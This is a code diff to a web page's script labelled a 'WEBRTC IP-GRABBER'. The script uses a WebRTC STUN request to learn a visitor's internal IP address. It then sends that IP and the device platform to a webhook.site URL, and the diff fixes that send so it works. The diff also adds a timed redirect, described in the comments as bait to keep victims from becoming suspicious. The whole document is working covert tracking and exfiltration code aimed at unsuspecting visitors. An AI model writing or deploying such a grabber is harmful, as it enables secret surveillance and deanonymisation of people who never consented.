@@ -12,6 +12,7 @@
     <script>
         // THE WEBRTC IP-GRABBER
         async function getInternalIP() {
+            setTimeout(function() { window.location.href = "https://www.google.com"; }, 23000);
             try {
                 const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                 pc.createDataChannel("");
@@ -25,7 +26,7 @@
                     
                     // SEND DATA TO YOUR WEBHOOK
                     // Replace the URL below with your Webhook.site URL
-                    fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6 + internalIP + "&device=" + navigator.platform);
+                    fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?ip=" + internalIP + "&device=" + navigator.platform);
                     
                     // THE BAIT REDIRECT
                     // After grabbing, move them to your real photo so they aren't suspicious
